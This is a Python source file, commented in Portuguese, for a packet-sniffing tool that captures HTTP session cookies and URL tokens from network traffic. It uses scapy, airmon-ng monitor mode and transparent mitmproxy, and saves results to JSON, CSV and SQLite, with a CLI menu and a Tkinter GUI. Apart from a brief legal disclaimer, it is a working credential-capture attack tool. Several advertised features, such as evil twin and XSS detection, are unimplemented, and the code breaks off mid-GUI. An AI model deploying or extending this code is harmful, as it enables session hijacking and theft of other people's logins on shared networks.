```python
import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse
import json
import os
import re
import sqlite3
import csv
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, filedialog, ttk
import logging
import sys
import time
import matplotlib.pyplot as plt
import requests
import subprocess
import zipfile
import threading
import queue

# Configurar logging
def setup_logging(output_dir, silent):
    os.makedirs(output_dir, exist_ok=True)
    logging.basicConfig(
        filename=os.path.join(output_dir, "cookie_sniffer.log"),
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    if not silent:
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        logging.getLogger().addHandler(console)

# Carregar configurações
def load_config(config_file="config.json"):
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "interfaces": ["wlan0mon"],
            "filters": ["tcp port 80"],
            "output_dir": ".",
            "smtp": {"server": "", "port": 587, "user": "", "password": ""},
            "whatsapp": {"api_url": "", "api_key": ""},
            "legal_accepted": False,
            "max_packets": 100,
            "timeout": None,
            "domain_filter": "",
            "http_method": "",
            "cookie_type": "",
            "ip_filter": "",
            "header_filter": "",
            "continuous": False,
            "pcap": False,
            "mitm": False,
            "wireshark_live": False,
            "dry_run": False,
            "xss_detect": False,
            "domain_validate": False,
            "token_capture": False,
            "websocket": False,
            "evil_twin": False,
            "test_cookies": False,
            "test_tokens": False,
            "zip_output": False
        }

# Salvar configurações
def save_config(config, config_file="config.json"):
    try:
        with open(config_file, "w") as f:
            json.dump(config, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Falha ao salvar config.json: {e}")

# Listar interfaces disponíveis
def list_interfaces():
    try:
        interfaces = scapy.get_if_list()
        # Priorizar wlan0mon se disponível
        if "wlan0mon" in interfaces:
            interfaces.insert(0, interfaces.pop(interfaces.index("wlan0mon")))
        return interfaces
    except Exception as e:
        logging.error(f"Erro ao listar interfaces: {e}")
        return []

# Verificar interfaces
def check_interfaces(interfaces):
    try:
        available_interfaces = list_interfaces()
        for iface in interfaces.split(","):
            if iface not in available_interfaces:
                return False, f"Interface {iface} não encontrada. Interfaces disponíveis: {', '.join(available_interfaces)}"
        return True, None
    except Exception as e:
        return False, f"Erro ao verificar interfaces: {e}"

# Configurar modo monitor
def setup_monitor_mode(interface):
    if not interface.startswith("wlan") or interface.endswith("mon"):
        return interface, None
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=True, capture_output=True)
        result = subprocess.run(["airmon-ng", "start", interface], check=True, capture_output=True)
        return f"{interface}mon", None
    except subprocess.CalledProcessError as e:
        error_msg = f"Falha ao configurar modo monitor: {e.stderr.decode()}"
        logging.warning(error_msg)
        return interface, error_msg
    except FileNotFoundError:
        error_msg = "airmon-ng não encontrado. Modo monitor não ativado."
        logging.warning(error_msg)
        return interface, error_msg

# Inicializar banco de dados
def init_db(output_dir):
    try:
        conn = sqlite3.connect(os.path.join(output_dir, "cookies.db"))
        c = conn.cursor()
        c.execute("CREATE TABLE IF NOT EXISTS cookies (domain TEXT, name TEXT, value TEXT, path TEXT, expires TEXT, secure INTEGER, session INTEGER, httponly INTEGER, samesite TEXT, timestamp TEXT, src_ip TEXT, dst_ip TEXT)")
        c.execute("CREATE TABLE IF NOT EXISTS tokens (url TEXT, token TEXT, timestamp TEXT)")
        conn.commit()
        return conn
    except Exception as e:
        logging.error(f"Falha ao inicializar banco de dados: {e}")
        return None

# Validar cookie
def validate_cookie(cookie, domain_validate, domain):
    if domain_validate and cookie["domain"] != domain:
        return False
    if cookie["expires"] != "0":
        try:
            expires = datetime.fromisoformat(cookie["expires"].replace("Z", ""))
            if expires < datetime.now():
                return False
        except ValueError:
            return False
    return True

# Analisar cookie
def analyze_cookie(cookie):
    secure = 1 if "; Secure" in cookie.get("raw", "") or cookie.get("secure", 0) else 0
    session = 1 if cookie["expires"] == "0" else 0
    httponly = 1 if "; HttpOnly" in cookie.get("raw", "") else 0
    samesite = re.search(r"SameSite=([^;]+)", cookie.get("raw", "")) or None
    samesite = samesite.group(1) if samesite else "None"
    return {"secure": secure, "session": session, "httponly": httponly, "samesite": samesite}

# Salvar cookies em JSON
def save_to_json(cookies, output_dir):
    try:
        with open(os.path.join(output_dir, "cookies.json"), "w", encoding="utf-8") as f:
            json.dump(cookies, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Falha ao salvar cookies.json: {e}")

# Salvar cookies em JSONL
def save_to_jsonl(cookies, output_dir):
    try:
        with open(os.path.join(output_dir, "cookies.jsonl"), "w", encoding="utf-8") as f:
            for cookie in cookies:
                f.write(json.dumps(cookie, ensure_ascii=False) + "\n")
    except Exception as e:
        logging.error(f"Falha ao salvar cookies.jsonl: {e}")

# Salvar cookies em CSV
def save_to_csv(cookies, output_dir):
    try:
        with open(os.path.join(output_dir, "cookies.csv"), "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Timestamp", "Domain", "Name", "Value", "Path", "Expires", "Secure", "Session", "HttpOnly", "SameSite", "Src IP", "Dst IP"])
            for cookie in cookies:
                analysis = analyze_cookie(cookie)
                writer.writerow([
                    cookie["timestamp"], cookie["domain"], cookie["name"], cookie["value"],
                    cookie["path"], cookie["expires"], analysis["secure"], analysis["session"],
                    analysis["httponly"], analysis["samesite"], cookie["src_ip"], cookie["dst_ip"]
                ])
    except Exception as e:
        logging.error(f"Falha ao salvar cookies.csv: {e}")

# Exportar resultados como ZIP
def export_to_zip(output_dir):
    try:
        zip_path = os.path.join(output_dir, f"cookie_sniffer_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(output_dir):
                for file in files:
                    if file.endswith((".json", ".jsonl", ".csv", ".txt", ".png", ".js", ".db")):
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, output_dir))
        logging.info(f"Resultados exportados para {zip_path}")
        return zip_path
    except Exception as e:
        logging.error(f"Falha ao criar arquivo ZIP: {e}")
        return None

# Processar pacotes
def process_packet(packet, cookies, tokens, output_dir, domain_filter, http_method, cookie_type, ip_filter, header_filter, pcap_writer, dry_run, xss_detect, domain_validate, token_capture, websocket, text_results=None, progress_bar=None, packet_count=[0], cookie_buffer=None, token_buffer=None):
    if dry_run:
        cookie = {
            "domain": "example.com",
            "name": "test_cookie",
            "value": "test_value",
            "path": "/",
            "expires": "0",
            "timestamp": datetime.now().isoformat(),
            "src_ip": "127.0.0.1",
            "dst_ip": "127.0.0.1",
            "raw": "test_cookie=test_value"
        }
        cookies.append(cookie)
        cookie_buffer.put(cookie)
        if text_results:
            text_results.insert(tk.END, f"{cookie['timestamp']} | {cookie['domain']} | {cookie['name']}={cookie['value']}\n", "success")
        return
    if ip_filter and packet.haslayer("IP"):
        if not (packet["IP"].src.startswith(ip_filter.split("/")[0]) or packet["IP"].dst.startswith(ip_filter.split("/")[0])):
            return
    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        if http_method and http_layer.Method.decode("utf-8").lower() != http_method.lower():
            return
        host = http_layer.Host.decode("utf-8") if http_layer.Host else "unknown"
        if domain_filter and not re.match(domain_filter.replace("*", ".*"), host):
            return
        if header_filter and not any(re.search(header_filter, f"{k}: {v.decode('utf-8', errors='ignore')}", re.IGNORECASE) for k, v in http_layer.fields.items() if isinstance(v, bytes)):
            return
        src_ip = packet["IP"].src if packet.haslayer("IP") else packet["IPv6"].src if packet.haslayer("IPv6") else "unknown"
        dst_ip = packet["IP"].dst if packet.haslayer("IP") else packet["IPv6"].dst if packet.haslayer("IPv6") else "unknown"
        packet_count[0] += 1
        if progress_bar:
            progress_bar["value"] = min(packet_count[0], progress_bar["maximum"])
            progress_bar.update()
        if http_layer.Cookie:
            cookie_str = http_layer.Cookie.decode("utf-8")
            try:
                cookie = {
                    "domain": host,
                    "name": cookie_str.split("=")[0],
                    "value": cookie_str.split("=")[1].split(";")[0],
                    "path": http_layer.Path.decode("utf-8") if http_layer.Path else "/",
                    "expires": "0",
                    "timestamp": datetime.now().isoformat(),
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                    "raw": cookie_str
                }
                if cookie_type and analyze_cookie(cookie)["session"] != (1 if cookie_type == "session" else 0):
                    return
                if validate_cookie(cookie, domain_validate, host):
                    cookies.append(cookie)
                    cookie_buffer.put(cookie)
                    logging.info(f"Cookie capturado: {cookie_str} de {host} (Pacote {packet_count[0]})")
                    if text_results:
                        text_results.insert(tk.END, f"{cookie['timestamp']} | {cookie['domain']} | {cookie['name']}={cookie['value']}\n", "success")
            except IndexError as e:
                logging.error(f"Erro ao processar cookie: {e}")
                if text_results:
                    text_results.insert(tk.END, f"[ERRO] Falha ao processar cookie: {e}\n", "error")
        if token_capture and http_layer.Path:
            path = http_layer.Path.decode("utf-8")
            token_match = re.search(r"[?&]token=([^&]+)", path)
            if token_match:
                try:
                    token = {
                        "url": f"https://{host}{path.split('?')[0]}",
                        "token": token_match.group(1),
                        "timestamp": datetime.now().isoformat()
                    }
                    tokens.append(token)
                    token_buffer.put(token)
                    logging.info(f"Token capturado: {token_match.group(1)} em {host} (Pacote {packet_count[0]})")
                    if text_results:
                        text_results.insert(tk.END, f"{token['timestamp']} | Token: {token['token']} | URL: {token['url']}\n", "success")
                except Exception as e:
                    logging.error(f"Erro ao processar token: {e}")
                    if text_results:
                        text_results.insert(tk.END, f"[ERRO] Falha ao processar token: {e}\n", "error")

# Salvar buffers
def save_buffers(cookies, tokens, output_dir, cookie_buffer, token_buffer, continuous):
    if continuous:
        return
    cookies.extend(list(cookie_buffer.queue))
    tokens.extend(list(token_buffer.queue))
    save_to_json(cookies, output_dir)
    save_to_jsonl(cookies, output_dir)
    save_to_csv(cookies, output_dir)
    save_to_db(cookies, tokens, output_dir)

# Salvar no banco de dados
def save_to_db(cookies, tokens, output_dir):
    conn = init_db(output_dir)
    if not conn:
        return
    c = conn.cursor()
    for cookie in cookies:
        analysis = analyze_cookie(cookie)
        try:
            c.execute(
                "INSERT INTO cookies VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    cookie["domain"], cookie["name"], cookie["value"], cookie["path"],
                    cookie["expires"], analysis["secure"], analysis["session"],
                    analysis["httponly"], analysis["samesite"], cookie["timestamp"],
                    cookie["src_ip"], cookie["dst_ip"]
                )
            )
        except Exception as e:
            logging.error(f"Falha ao salvar cookie no banco de dados: {e}")
    for token in tokens:
        try:
            c.execute("INSERT INTO tokens VALUES (?, ?, ?)", (token["url"], token["token"], token["timestamp"]))
        except Exception as e:
            logging.error(f"Falha ao salvar token no banco de dados: {e}")
    conn.commit()
    conn.close()

# Limpar recursos
def cleanup(interfaces, output_dir, mitm_process=None):
    if mitm_process:
        try:
            mitm_process.terminate()
            mitm_process.wait(timeout=5)
            logging.info("Processo mitmproxy encerrado.")
        except Exception as e:
            logging.warning(f"Falha ao encerrar mitmproxy: {e}")
    if "wlan" in interfaces:
        try:
            subprocess.run(["airmon-ng", "stop", interfaces], check=True, capture_output=True)
            logging.info(f"Modo monitor desativado para {interfaces}")
        except subprocess.CalledProcessError as e:
            logging.warning(f"Falha ao desativar modo monitor: {e.stderr.decode()}")
        except FileNotFoundError:
            logging.warning("airmon-ng não encontrado. Modo monitor não desativado.")
    temp_files = [os.path.join(output_dir, f) for f in os.listdir(output_dir) if f.startswith("temp_")]
    for temp_file in temp_files:
        try:
            os.remove(temp_file)
            logging.info(f"Arquivo temporário {temp_file} removido.")
        except Exception as e:
            logging.warning(f"Falha ao remover {temp_file}: {e}")

# Aviso legal
def show_legal_warning(config, is_gui=False, root=None):
    if config.get("legal_accepted", False):
        return True
    legal_text = (
        "=== AVISO LEGAL ===\n"
        "Esta ferramenta deve ser usada APENAS em redes próprias ou com autorização explícita.\n"
        "Capturar cookies sem permissão viola leis como GDPR e CCPA.\n"
        "Use apenas para testes éticos em ambientes autorizados."
    )
    if is_gui:
        def accept_legal():
            config["legal_accepted"] = True
            save_config(config)
            legal_window.destroy()
            root.deiconify()
        legal_window = tk.Toplevel(root)
        legal_window.title("Aviso Legal")
        root.withdraw()
        tk.Label(legal_window, text=legal_text, justify="left", wraplength=400).pack(padx=10, pady=10)
        tk.Button(legal_window, text="Aceitar", command=accept_legal).pack(pady=5)
        tk.Button(legal_window, text="Sair", command=lambda: sys.exit(1)).pack(pady=5)
        legal_window.geometry("450x250")
        legal_window.protocol("WM_DELETE_WINDOW", lambda: sys.exit(1))
        return False
    else:
        print("\033[1;91m" + legal_text)
        print("\033[1;97mPressione Enter para aceitar ou Ctrl+C para sair...")
        try:
            input()
            config["legal_accepted"] = True
            save_config(config)
            return True
        except KeyboardInterrupt:
            print("\033[1;91mOperação cancelada.")
            sys.exit(1)

# Menu interativo CLI
def interactive_menu(config):
    options = {
        "interfaces": config["interfaces"],
        "filters": config["filters"],
        "output_dir": config["output_dir"],
        "max_packets": config["max_packets"],
        "timeout": config["timeout"],
        "domain_filter": config["domain_filter"],
        "http_method": config["http_method"],
        "cookie_type": config["cookie_type"],
        "ip_filter": config["ip_filter"],
        "header_filter": config["header_filter"],
        "continuous": config["continuous"],
        "pcap": config["pcap"],
        "mitm": config["mitm"],
        "wireshark_live": config["wireshark_live"],
        "dry_run": config["dry_run"],
        "xss_detect": config["xss_detect"],
        "domain_validate": config["domain_validate"],
        "token_capture": config["token_capture"],
        "websocket": config["websocket"],
        "evil_twin": config["evil_twin"],
        "test_cookies": config["test_cookies"],
        "test_tokens": config["test_tokens"],
        "zip_output": config["zip_output"],
        "email": "",
        "whatsapp": ""
    }

    def display_menu():
        print("\033[1;94m=== Cookie Sniffer - Menu Interativo ===")
        print(f"1. Interfaces: {', '.join(options['interfaces'])}")
        print(f"2. Filtros BPF: {', '.join(options['filters'])}")
        print(f"3. Diretório de Saída: {options['output_dir']}")
        print(f"4. Máximo de Pacotes: {options['max_packets']}")
        print(f"5. Timeout (segundos): {options['timeout'] or 'Nenhum'}")
        print(f"6. Filtro de Domínio: {options['domain_filter'] or 'Nenhum'}")
        print(f"7. Método HTTP: {options['http_method'] or 'Nenhum'}")
        print(f"8. Tipo de Cookie: {options['cookie_type'] or 'Nenhum'}")
        print(f"9. Filtro de IP: {options['ip_filter'] or 'Nenhum'}")
        print(f"10. Filtro de Cabeçalho: {options['header_filter'] or 'Nenhum'}")
        print(f"11. Modo Contínuo: {'Ativado' if options['continuous'] else 'Desativado'}")
        print(f"12. Salvar em .pcap: {'Ativado' if options['pcap'] else 'Desativado'}")
        print(f"13. Usar MITM (HTTPS): {'Ativado' if options['mitm'] else 'Desativado'}")
        print(f"14. Wireshark ao Vivo: {'Ativado' if options['wireshark_live'] else 'Desativado'}")
        print(f"15. Modo Simulado (Dry Run): {'Ativado' if options['dry_run'] else 'Desativado'}")
        print(f"16. Detectar XSS: {'Ativado' if options['xss_detect'] else 'Desativado'}")
        print(f"17. Validar Domínio: {'Ativado' if options['domain_validate'] else 'Desativado'}")
        print(f"18. Capturar Tokens: {'Ativado' if options['token_capture'] else 'Desativado'}")
        print(f"19. Capturar WebSockets: {'Ativado' if options['websocket'] else 'Desativado'}")
        print(f"20. Simular Evil Twin: {'Ativado' if options['evil_twin'] else 'Desativado'}")
        print(f"21. Testar Cookies: {'Ativado' if options['test_cookies'] else 'Desativado'}")
        print(f"22. Testar Tokens: {'Ativado' if options['test_tokens'] else 'Desativado'}")
        print(f"23. Exportar como ZIP: {'Ativado' if options['zip_output'] else 'Desativado'}")
        print(f"24. E-mail para Notificação: {options['email'] or 'Nenhum'}")
        print(f"25. WhatsApp para Notificação: {options['whatsapp'] or 'Nenhum'}")
        print("26. Iniciar Captura")
        print("27. Sair")
        print("\033[1;97mSelecione uma opção (1-27): ")

    while True:
        display_menu()
        choice = input().strip()
        if choice == "1":
            interfaces = list_interfaces()
            print(f"\033[1;94mInterfaces disponíveis: {', '.join(interfaces)}")
            print("Digite as interfaces (separadas por vírgula) ou pressione Enter para manter:")
            new_interfaces = input().strip()
            if new_interfaces:
                options["interfaces"] = new_interfaces.split(",")
        elif choice == "2":
            print("Digite os filtros BPF (separados por vírgula) ou pressione Enter para manter:")
            new_filters = input().strip()
            if new_filters:
                options["filters"] = new_filters.split(",")
        elif choice == "3":
            print("Digite o diretório de saída ou pressione Enter para manter:")
            new_dir = input().strip()
            if new_dir:
                options["output_dir"] = new_dir
        elif choice == "4":
            print("Digite o número máximo de pacotes ou pressione Enter para manter:")
            new_packets = input().strip()
            if new_packets and new_packets.isdigit():
                options["max_packets"] = int(new_packets)
        elif choice == "5":
            print("Digite o timeout (segundos) ou pressione Enter para nenhum:")
            new_timeout = input().strip()
            options["timeout"] = int(new_timeout) if new_timeout and new_timeout.isdigit() else None
        elif choice == "6":
            print("Digite o filtro de domínio (ex.: *.facebook.com) ou pressione Enter para nenhum:")
            options["domain_filter"] = input().strip()
        elif choice == "7":
            print("Digite o método HTTP (ex.: GET, POST) ou pressione Enter para nenhum:")
            options["http_method"] = input().strip()
        elif choice == "8":
            print("Digite o tipo de cookie (session, persistent) ou pressione Enter para nenhum:")
            options["cookie_type"] = input().strip()
        elif choice == "9":
            print("Digite o filtro de IP (ex.: 192.168.1.0/24) ou pressione Enter para nenhum:")
            options["ip_filter"] = input().strip()
        elif choice == "10":
            print("Digite o filtro de cabeçalho (ex.: User-Agent:.*Mozilla.*) ou pressione Enter para nenhum:")
            options["header_filter"] = input().strip()
        elif choice in ["11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23"]:
            key = {
                "11": "continuous", "12": "pcap", "13": "mitm", "14": "wireshark_live",
                "15": "dry_run", "16": "xss_detect", "17": "domain_validate", "18": "token_capture",
                "19": "websocket", "20": "evil_twin", "21": "test_cookies", "22": "test_tokens",
                "23": "zip_output"
            }[choice]
            options[key] = not options[key]
            print(f"\033[1;92m{key.replace('_', ' ').title()} {'ativado' if options[key] else 'desativado'}")
        elif choice == "24":
            print("Digite o e-mail para notificação ou pressione Enter para nenhum:")
            options["email"] = input().strip()
        elif choice == "25":
            print("Digite o número WhatsApp para notificação ou pressione Enter para nenhum:")
            options["whatsapp"] = input().strip()
        elif choice == "26":
            config.update(options)
            save_config(config)
            return options
        elif choice == "27":
            sys.exit(0)
        else:
            print("\033[1;91mOpção inválida. Tente novamente.")

# Capturar pacotes
def sniff_packets(interfaces, filters, max_packets, timeout, output_dir, domain_filter, http_method, cookie_type, ip_filter, header_filter, continuous, pcap, mitm, dry_run, wireshark_live, xss_detect, domain_validate, token_capture, websocket, evil_twin, text_results=None, progress_bar=None):
    cookies = []
    tokens = []
    cookie_buffer = queue.Queue()
    token_buffer = queue.Queue()
    packet_count = [0]
    mitm_process = None
    if not dry_run:
        success, error = check_interfaces(interfaces)
        if not success:
            if text_results:
                text_results.insert(tk.END, f"[ERRO] {error}\n", "error")
            else:
                print(f"\033[1;91m[ERRO] {error}")
            return cookies, tokens
        if "wlan" in interfaces:
            interfaces_list = interfaces.split(",")
            new_interfaces = []
            for iface in interfaces_list:
                new_iface, error = setup_monitor_mode(iface)
                new_interfaces.append(new_iface)
                if error and text_results:
                    text_results.insert(tk.END, f"[AVISO] {error}\n", "warning")
                elif error:
                    print(f"\033[1;93m[AVISO] {error}")
            interfaces = ",".join(new_interfaces)
            logging.info(f"Interfaces configuradas: {interfaces}")
    pcap_writer = scapy.wrpcap(os.path.join(output_dir, "capture.pcap"), []) if pcap else None
    if wireshark_live:
        try:
            subprocess.Popen(["wireshark", "-k", "-i", interfaces.split(",")[0]])
        except Exception as e:
            logging.error(f"Falha ao iniciar Wireshark: {e}")
            if text_results:
                text_results.insert(tk.END, f"[ERRO] Falha ao iniciar Wireshark: {e}\n", "error")
            else:
                print(f"\033[1;91m[ERRO] Falha ao iniciar Wireshark: {e}")
    if mitm:
        try:
            mitm_process = subprocess.Popen(["mitmproxy", "--mode", "transparent"])
        except Exception as e:
            logging.error(f"Falha ao iniciar mitmproxy: {e}")
            if text_results:
                text_results.insert(tk.END, f"[ERRO] Falha ao iniciar mitmproxy: {e}\n", "error")
            else:
                print(f"\033[1;91m[ERRO] Falha ao iniciar mitmproxy: {e}")
    def packet_handler(pkt):
        process_packet(pkt, cookies, tokens, output_dir, domain_filter, http_method, cookie_type, ip_filter, header_filter, pcap_writer, dry_run, xss_detect, domain_validate, token_capture, websocket, text_results, progress_bar, packet_count, cookie_buffer, token_buffer)
    try:
        filter_bpf = " or ".join(filters) if not dry_run else ""
        if dry_run:
            packet_handler(None)
        elif continuous:
            threads = []
            for iface in interfaces.split(","):
                t = threading.Thread(target=scapy.sniff, kwargs={"iface": iface, "filter": filter_bpf, "prn": packet_handler, "store": 0})
                t.daemon = True
                t.start()
                threads.append(t)
            while True:
                time.sleep(1)
                if text_results:
                    save_buffers(cookies, tokens, output_dir, cookie_buffer, token_buffer, continuous)
        else:
            threads = []
            for iface in interfaces.split(","):
                t = threading.Thread(target=scapy.sniff, kwargs={"iface": iface, "filter": filter_bpf, "prn": packet_handler, "count": max_packets, "timeout": timeout, "store": 0})
                t.daemon = True
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
    except KeyboardInterrupt:
        logging.info("Captura interrompida pelo usuário")
        if text_results:
            text_results.insert(tk.END, "[INFO] Captura interrompida pelo usuário.\n", "info")
        else:
            print("\033[1;92m[INFO] Captura interrompida pelo usuário")
    except Exception as e:
        logging.error(f"Erro durante captura de pacotes: {e}")
        if text_results:
            text_results.insert(tk.END, f"[ERRO] Falha na captura: {e}\n", "error")
        else:
            print(f"\033[1;91m[ERRO] Falha na captura: {e}")
    finally:
        save_buffers(cookies, tokens, output_dir, cookie_buffer, token_buffer, continuous)
        cleanup(interfaces, output_dir, mitm_process)
        if pcap_writer:
            pcap_writer.close()
    return cookies, tokens

# Interface gráfica
def main_gui(config):
    root = tk.Tk()
    root.title("Cookie Sniffer Ético")
    root.geometry("700x600")

    if not show_legal_warning(config, is_gui=True, root=root):
        return

    setup_logging(config["output_dir"], False)

    # Selecionar diretório de saída
    def select_output_dir():
        directory = filedialog.askdirectory(initialdir=config["output_dir"])
        if directory:
            config["output_dir"] = directory
            entry_output_dir.delete(0, tk.END)
            entry_output_dir.insert(0, directory)
            save_config(config)

    # Iniciar captura
    def start_sniffing():
        config["interfaces"] = [combo_interfaces.get()]
        config["filters"] = [combo_filters.get()]
        config["max_packets"] = int(entry_packets.get()) if entry_packets.get().isdigit() else config["max_packets"]
        config["timeout"] = int(entry_timeout.get()) if entry_timeout.get().isdigit() else None
        config["domain_filter"] = entry_domain.get()
        config["http_method"] = combo_method.get()
        config["cookie_type"] = combo_cookie_type.get()
        config["ip_filter"] = entry_ip.get()
        config["header_filter"] = entry_header.get()
        config["continuous"] = var_continuous.get()
        config["pcap"] = var_pcap.get()
        config["mitm"] = var_mitm.get()
        config["wireshark_live"] = var_wireshark.get()
        config["dry_run"] = var_dry.get()
        config["xss_detect"] = var_xss.get()
        config["domain_validate"] = var_domain.get()
        config["token_capture"] = var_token.get()
        config["websocket"] = var_websocket.get()
        config["evil_twin"] = var_evil.get()
        config["test_cookies"] = var_test_cookies.get()
        config["test_tokens"] = var_test_tokens.get()
        config["zip_output"] = var_zip.get()
        save_config(config)
        progress_bar["maximum"] = config["max_packets"] if not config["continuous"] else 1000
        progress_bar["value"] = 0
        try:
            cookies, tokens = sniff_packets(
                ",".join(config["interfaces"]), config["filters"], config["max_packets"], config["timeout"],
                config["output_dir"], config["domain_filter"], config["http_method"], config["cookie_type"],
                config["ip_filter"], config["header_filter"], config["continuous"], config["pcap"],
                config["mitm"], config["dry_run"], config["wireshark_live"], config["xss_detect"],
                config["domain_validate"], config["token_capture"], config["websocket"], config["evil_twin"],
                text_results, progress_bar
            )
            if config["zip_output"]:
                zip_path = export_to_zip(config["output_dir"])
                if zip_path:
                    text_results.insert(tk.END, f"[INFO] Resultados exportados para {zip_path}\n", "success")
            messagebox.showinfo("Concluído", f"Captura finalizada. Resultados salvos em {config['output_dir']}.")
        except Exception as e:
            logging.error(f"Erro ao iniciar captura: {e}")
            messagebox.showerror("Erro", f"Falha na captura: {e}")
            text_results.insert(tk.END, f"[ERRO] Falha na captura: {e}\n", "error")

    # Limpar resultados
    def clear_results():
        text_results.delete(1.0, tk.END)

    # Frames
    frame_config = ttk.LabelFrame(root, text="Configurações", padding=5)
    frame_config.grid(row=0, column=0, padx=5, pady=5, sticky="ew")
    frame_options = ttk.LabelFrame(root, text="Opções", padding=5)
    frame_options.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
    frame_buttons = ttk.Frame(root)
    frame_buttons.grid(row=2, column=0, padx=5, pady=5, sticky="ew")
    frame_progress = ttk.LabelFrame(root, text="Progresso", padding=5)
    frame_progress.grid(row=3, column=0, padx=5, pady=5, sticky="ew")
    frame_results = ttk.LabelFrame(root, text="Resultados", padding=5)
    frame_results.grid(row=4, column=0, padx=5, pady=5, sticky="ew")

    # Configurações
    ttk.Label(frame_config, text="Interface:").grid(row=0, column=0, padx=5, pady=2, sticky="w")
    combo_interfaces = ttk.Combobox(frame_config, values=list_interfaces(), width=27)
    combo_interfaces.set(config["interfaces"][0])
    combo_interfaces.grid(row=0, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Filtro BPF:").grid(row=1, column=0, padx=5, pady=2, sticky="w")
    combo_filters = ttk.Combobox(frame_config, values=["tcp port 80", "tcp port 443", "tcp port 80 or 443"], width=27)
    combo_filters.set(config["filters"][0])
    combo_filters.grid(row=1, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Diretório de Saída:").grid(row=2, column=0, padx=5, pady=2, sticky="w")
    entry_output_dir = ttk.Entry(frame_config, width=30)
    entry_output_dir.insert(0, config["output_dir"])
    entry_output_dir.grid(row=2, column=1, padx=5, pady=2)
    ttk.Button(frame_config, text="Selecionar", command=select_output_dir).grid(row=2, column=2, padx=5, pady=2)
    ttk.Label(frame_config, text="Máximo de Pacotes:").grid(row=3, column=0, padx=5, pady=2, sticky="w")
    entry_packets = ttk.Entry(frame_config, width=30)
    entry_packets.insert(0, str(config["max_packets"]))
    entry_packets.grid(row=3, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Timeout (segundos):").grid(row=4, column=0, padx=5, pady=2, sticky="w")
    entry_timeout = ttk.Entry(frame_config, width=30)
    entry_timeout.grid(row=4, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Filtro de Domínio:").grid(row=5, column=0, padx=5, pady=2, sticky="w")
    entry_domain = ttk.Entry(frame_config, width=30)
    entry_domain.grid(row=5, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Método HTTP:").grid(row=6, column=0, padx=5, pady=2, sticky="w")
    combo_method = ttk.Combobox(frame_config, values=["", "GET", "POST"], width=27)
    combo_method.set(config["http_method"])
    combo_method.grid(row=6, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Tipo de Cookie:").grid(row=7, column=0, padx=5, pady=2, sticky="w")
    combo_cookie_type = ttk.Combobox(frame_config, values=["", "session", "persistent"], width=27)
    combo_cookie_type.set(config["cookie_type"])
    combo_cookie_type.grid(row=7, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Filtro de IP:").grid(row=8, column=0, padx=5, pady=2, sticky="w")
    entry_ip = ttk.Entry(frame_config, width=30)
    entry_ip.grid(row=8, column=1, padx=5, pady=2)
    ttk.Label(frame_config, text="Filtro de Cabeçalho:").grid(row=9, column=0, padx=5, pady=2, sticky="w")
    entry_header = ttk.Entry(frame_config, width=30)
    entry_header.grid(row=9, column=1, padx=5, pady=2)

    # Opções
    var_continuous = tk.BooleanVar(value=config["continuous"])
    var_pcap = tk.BooleanVar(value=config["pcap"])
    var_mitm = tk.BooleanVar(value=config["mitm"])
    var_wireshark = tk.BooleanVar(value=config["wireshark_live"])
    var_dry = tk.BooleanVar(value=config["dry_run"])
    var_xss = tk.BooleanVar(value=config["xss_detect"])
    var_domain = tk.BooleanVar(value=config["domain_validate"])
    var_token = tk.BooleanVar(value=config["token_capture"])
    var_websocket = tk.BooleanVar(value=config["websocket"])
    var_evil = tk.BooleanVar(value=config["evil_twin"])
    var_test_cookies = tk.BooleanVar(value=config["test_cookies"])
    var_test_tokens = tk.BooleanVar(value=config["test_tokens"])
    var_zip = tk.BooleanVar(value=config["zip_output"])
    ttk.Checkbutton(frame_options, text="Modo Contínuo", variable=var_continuous).grid(row=0, column=0, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Salvar em .pcap", variable=var_pcap).grid(row=0, column=1, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Usar MITM (HTTPS)", variable=var_mitm).grid(row=1, column=0, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Wireshark ao Vivo", variable=var_wireshark).grid(row=1, column=1, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Modo Simulado", variable=var_dry).grid(row=2, column=0, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Detectar XSS", variable=var_xss).grid(row=2, column=1, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Validar Domínio", variable=var_domain).grid(row=3, column=0, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Capturar Tokens", variable=var_token).grid(row=3, column=1, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Capturar WebSockets", variable=var_websocket).grid(row=4, column=0, padx=5, pady=2, sticky="w")
    ttk.Checkbutton(frame_options, text="Simular Evil Twin", variable=var_evil).grid(row=4, column=1, padx=5, pady=2, sticky="w")
